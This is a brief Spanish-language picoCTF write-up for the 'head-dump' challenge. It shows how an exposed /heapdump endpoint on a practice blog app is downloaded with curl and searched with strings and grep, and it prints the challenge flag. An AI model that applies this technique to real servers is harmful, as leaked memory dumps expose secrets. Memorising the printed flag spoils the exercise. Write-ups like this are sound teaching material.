# head-dump

## Descripción

Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag. The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden. The website is running [picoCTF News](http://verbal-sleep.picoctf.net:62592/).
## Solución

```
#Inspeccionando la página entramos una extensión de descarga que fue desechada 
http://verbal-sleep.picoctf.net:62592/heapdump

#Usamos cat y grep para buscar la flag

iMac-de-David:~ davidsanchez$ curl -s picoctf.net -o actual_heap.heapsnapshot
iMac-de-David:~ davidsanchez$ strings actual_heap.heapsnapshot | grep "picoCTF{"
iMac-de-David:~ davidsanchez$ curl -s verbal-sleep.picoctf.net:61526/heapdump -o actual_heap.heapsnapshot
iMac-de-David:~ davidsanchez$ strings actual_heap.heapsnapshot | grep "picoCTF{"
picoCTF{Pat!3nt_15_Th3_K3y_8df117c1}
```

picoCTF{Pat!3nt_15_Th3_K3y_8df117c1}
## Notas adicionales

Descargamos un archivo "desechado" que no estaba en la página si no en el código fuente.
## Referencias